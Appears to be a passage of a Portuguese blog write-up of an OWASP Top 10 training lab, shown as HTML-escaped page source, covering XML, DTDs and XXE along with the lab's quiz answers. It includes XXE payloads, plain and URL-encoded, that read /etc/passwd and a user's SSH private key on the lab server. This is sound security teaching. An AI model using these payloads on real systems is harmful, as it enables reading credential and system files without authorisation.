+&lt;h2 data-hextra-search-id=&#34;xxe&#34;&gt;XXE&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;xxe&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#xxe&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Entidade externa de XML ou XXE é uma vulnerabilidade que se aproveita do processamento de dados de XML em sistemas e aplicativos. O parser do XML processa uma referência a uma entidade externa, que pode ser um recurso do servidor (local) ou um recurso externo.&lt;/p&gt;
+&lt;p&gt;Existem dois tipos de XXE:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;XXE que é mostrado imediatamente: a resposta do payload do XXE é exibida de imediato.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;XXE às cegas: não há uma resposta imediata da aplicação e o atacante tem que refletir a saída do payload em um arquivo.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;Deploy the machine attached to the task.&lt;/strong&gt;&lt;br&gt;
+Resposta: não é necessário responder.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;entidade-externa-xml-extensible-markup-language&#34;&gt;Entidade externa XML (eXtensible Markup Language)&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;entidade-externa-xml-extensible-markup-language&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#entidade-externa-xml-extensible-markup-language&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;XML é uma linguagem de marcação, lida por humanos e máquinas, é utilizada para transporta e armazenar dados.&lt;/p&gt;
+&lt;h4 data-hextra-search-id=&#34;porque-usar-xml-&#34;&gt;Porque usar XML ?&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;porque-usar-xml-&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#porque-usar-xml-&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;XML é independente de plataforma e também uma linguagem de programação independente, garantindo assim suporte caso haja uma mudança de tecnologia ao longo do tempo. Além disso, os dados transportados usando XML podem sofrer alterações a qualquer momento sem afetar a apresentação dos dados. XML permite a validação utilizando &lt;em&gt;Document Type Definition (DTD)&lt;/em&gt; e &lt;em&gt;Schema&lt;/em&gt;, tornando-o assim livre de erros de sintaxe.&lt;/p&gt;
+&lt;h4 data-hextra-search-id=&#34;sintaxe&#34;&gt;Sintaxe&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;sintaxe&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#sintaxe&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Documentos XML iniciam com a linha abaixo (&lt;code&gt;XML prolog&lt;/code&gt;), além disso é uma boa prática utiliza-lo.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Todo documento XML possui o elemento &amp;ldquo;ROOT&amp;rdquo; e seus filhos dentro desse documento.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/01/OWASPTOP10/OWASPTOP10-XML.webp&#34; alt=&#34;xml&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Todos os elementos: &lt;code&gt;&amp;lt;to&amp;gt;, &amp;lt;from&amp;gt;, &amp;lt;subject&amp;gt; e &amp;lt;text&amp;gt;&lt;/code&gt; são filhos do elemento &amp;ldquo;ROOT&amp;rdquo; &lt;code&gt;&amp;lt;mail&amp;gt;&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Assim como no HTML podemos inserir atributos também.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;`&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;text&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;category =&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;message&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;You need to learn about XXE&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/text&amp;gt;&lt;/span&gt;`&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h5 data-hextra-search-id=&#34;perguntas-1&#34;&gt;Perguntas&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;perguntas-1&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#perguntas-1&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h5&gt;&lt;p&gt;&lt;strong&gt;Full form of XML&lt;/strong&gt;&lt;br&gt;
+Resposta:&lt;code&gt;eXtensible Markup Language&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Is it compulsory to have XML prolog in XML documents?&lt;/strong&gt;&lt;br&gt;
+Resposta:&lt;code&gt;no&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Can we validate XML documents against a schema?&lt;/strong&gt;&lt;br&gt;
+Resposta:&lt;code&gt;yes&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;How can we specify XML version and encoding in XML document?&lt;/strong&gt;&lt;br&gt;
+Resposta:&lt;code&gt;XML prolog&lt;/code&gt;&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;dtd-document-type-definition&#34;&gt;DTD (Document Type Definition)&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;dtd-document-type-definition&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#dtd-document-type-definition&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;DTD é o padrão para definição de tipo de documento. Através dele, definimos a estrutura, elementos e atributos de um documento XML.&lt;/p&gt;
+&lt;p&gt;Exemplo de DTD, arquivo &lt;code&gt;note.dtd&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE note [ 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    &amp;lt;!ELEMENT note (to,from,heading,body)&amp;gt;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!ELEMENT to (#PCDATA)&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!ELEMENT from (#PCDATA)&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!ELEMENT heading (#PCDATA)&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!ELEMENT body (#PCDATA)&amp;gt;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ]&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Após criar o DTD, podemos utilizá-lo para validar nosso documento XML, que deve estar em conformidade com as regras do DTD.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE note SYSTEM &amp;#34;note.dtd&amp;#34;&amp;gt;&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;note&amp;gt;&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;to&amp;gt;&lt;/span&gt;falcon&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/to&amp;gt;&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;from&amp;gt;&lt;/span&gt;feast&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/from&amp;gt;&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;heading&amp;gt;&lt;/span&gt;hacking&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/heading&amp;gt;&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;XXE attack&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/note&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Basicamente, na parte do DTD, está sendo definida uma note com quatro elementos: to, from, heading e body. Cada um desses elementos contém dados de texto (#PCDATA).&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;!DOCTYPE&lt;/code&gt;: define o elemento root do documento como sendo &lt;code&gt;note&lt;/code&gt;.&lt;/p&gt;
+&lt;h4 data-hextra-search-id=&#34;perguntas-2&#34;&gt;Perguntas&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;perguntas-2&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#perguntas-2&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;How do you define a new ELEMENT?&lt;/strong&gt;&lt;br&gt;
+Resposta: &lt;code&gt;!ELEMENT&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;How do you define a ROOT element?&lt;/strong&gt;&lt;br&gt;
+Resposta: &lt;code&gt;!DOCTYPE&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;How do you define a new ENTITY?&lt;/strong&gt;&lt;br&gt;
+Resposta:&lt;code&gt;!ENTITY&lt;/code&gt;&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;xxe---payload&#34;&gt;XXE - Payload&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;xxe---payload&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#xxe---payload&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Exemplo de um código utilizando &lt;code&gt;!ENTITY&lt;/code&gt; na definição do documento.
+Está sendo definido a entidade com o nome de &lt;code&gt;name&lt;/code&gt;e atribuindo o valor &lt;code&gt;feast&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE replace [&amp;lt;!ENTITY name &amp;#34;feast&amp;#34;&amp;gt;&lt;/span&gt; ]&amp;gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;userInfo&amp;gt;&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;firstName&amp;gt;&lt;/span&gt;falcon&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/firstName&amp;gt;&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;lastName&amp;gt;&lt;/span&gt;&amp;amp;name;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/lastName&amp;gt;&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/userInfo&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Um exemplo de XXE, usando &lt;code&gt;!ENTITY&lt;/code&gt; para ler arquivos no servidor, com a diferença que nosso valor será &lt;code&gt;SYSTEM&lt;/code&gt; e o caminho do arquivo (&lt;code&gt;/etc/passwd&lt;/code&gt;).&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt;&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE root [&amp;lt;!ENTITY read SYSTEM &amp;#39;file:///etc/passwd&amp;#39;&amp;gt;&lt;/span&gt;]&amp;gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;root&amp;gt;&lt;/span&gt;&amp;amp;read;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/root&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h4 data-hextra-search-id=&#34;perguntas-3&#34;&gt;Perguntas&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;perguntas-3&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#perguntas-3&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;Try the payload mentioned in description on the website.&lt;/strong&gt;&lt;br&gt;
+Resposta: não é necessário responder.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;explorando&#34;&gt;Explorando&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;explorando&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#explorando&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;No exemplo da aula é fornecido um website com um campo para entrada de dados.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/01/OWASPTOP10/OWASPTOP10-XXE.webp&#34; alt=&#34;xxe&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Enviamos nossa requisição para Burp.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/01/OWASPTOP10/OWASPTOP10-XXE-payload.webp&#34; alt=&#34;xxe payload&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;No parâmetro &lt;code&gt;xxe&lt;/code&gt;vamos enviar nosso payload encodado, utilizando o exemplo anterior.&lt;/p&gt;
+&lt;p&gt;Payload:&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;%3C%3Fxml%20version%3D%221.0%22%3F%3E%20%20%0A%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20read%20SYSTEM%20%27file%3A%2F%2F%2Fetc%2Fpasswd%27%3E%5D%3E%20%20%0A%3Croot%3E%26read%3B%3C%2Froot%3E&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/01/OWASPTOP10/OWASPTOP10-payload-encodado.webp&#34; alt=&#34;payload encodado&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Obtemos sucesso, o host é vulnerável a XXE.&lt;/p&gt;
+&lt;h4 data-hextra-search-id=&#34;perguntas-4&#34;&gt;Perguntas&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;perguntas-4&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#perguntas-4&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;Try to display your own name using any payload.&lt;/strong&gt;&lt;br&gt;
+Resposta: não é necessário responder.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;See if you can read the /etc/passwd&lt;/strong&gt;&lt;br&gt;
+Resposta: não é necessário responder.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;What is the name of the user in /etc/passwd&lt;/strong&gt;&lt;br&gt;
+Resposta: &lt;code&gt;falcon&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Where is falcon&amp;rsquo;s SSH key located?&lt;/strong&gt;&lt;br&gt;
+Resposta: &lt;code&gt;/home/falcon/.ssh/id_rsa&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;What are the first 18 characters for falcon&amp;rsquo;s private key&lt;/strong&gt;&lt;br&gt;
+Vamos alterar nosso payload para &lt;code&gt;file:///home/falcon/.ssh/id_rsa&lt;/code&gt;&lt;br&gt;
+Em um editor de texto qualquer contamos a quantidade de caracteres.&lt;br&gt;
+Resposta:&lt;code&gt;MIIEogIBAAKCAQEA7&lt;/code&gt;&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;controle-de-acesso-quebrado&#34;&gt;Controle de acesso quebrado&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;controle-de-acesso-quebrado&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#controle-de-acesso-quebrado&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Existem páginas que não devem ser acessadas por usuários comuns, como por exemplo, a área administrativa. Se um usuário comum conseguir acesso a esse conteúdo, ele pode visualizar dados sensíveis e realizar funções administrativas para as quais não foi autorizado.&lt;/p&gt;
+&lt;p&gt;Alguns cenários são demonstrados:&lt;/p&gt;
